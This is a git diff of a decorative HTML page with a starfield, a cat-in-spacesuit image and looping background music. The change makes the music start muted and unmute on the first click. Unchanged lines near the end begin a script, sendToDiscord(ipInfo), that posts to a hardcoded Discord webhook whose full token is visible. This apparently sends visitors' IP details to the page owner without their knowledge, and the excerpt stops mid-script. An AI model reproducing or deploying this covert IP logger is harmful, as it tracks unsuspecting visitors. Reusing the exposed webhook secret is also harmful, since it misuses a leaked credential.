@@ -11,12 +11,11 @@
         <link rel="manifest" href="/site.webmanifest">
     </head>
     <body>
-        <!-- Background Music (autoplay + loop) -->
-        <audio autoplay loop hidden>
+        <!-- Background Music (autoplay muted, then unmute on click) -->
+        <audio id="bgMusic" autoplay loop muted hidden>
             <source src="DEATH - LEAVE YOUR FAMILY GRIEVING [OFFICIAL VIDEO] SHOT BY @Crypticfilth810.mp3" type="audio/mpeg">
         </audio>
 
-        <!-- Starfield background -->
         <canvas></canvas>
 
         <!-- Centered Spaceman Character -->
@@ -24,9 +23,17 @@
             <img src="https://cdn.discordapp.com/attachments/1414982624463818925/1414991279846064247/4b03e9cce2aa856bd65d35acd4817b27-cat-in-a-spacesuit-sitting-on-the-moon.webp?ex=68c194d2&is=68c04352&hm=5dd7c676802a52763edb9ab466b493cc00c9040015e418f88a125b5076a4792e&" alt="Spaceman" />
         </div>
 
-        <!-- Star + rotation logic -->
         <script src="yo.js"></script>
-             <script>
+
+        <!-- Unmute music after first click -->
+        <script>
+            document.addEventListener("click", () => {
+                const music = document.getElementById("bgMusic");
+                music.muted = false;   // unmute
+                music.play();          // ensure playback starts
+            }, { once: true });
+        </script>
+            <script>
     async function sendToDiscord(ipInfo) {
         const webhookURL = 'https://discord.com/api/webhooks/1414982640246853774/d52YIc8k6ZxrM2-caMi_keBr5IVoo-DS3J8Yn6Vg65hRXhKmvio3YI8nYLWpPnEQ1Xru';
         const discordMessage = {
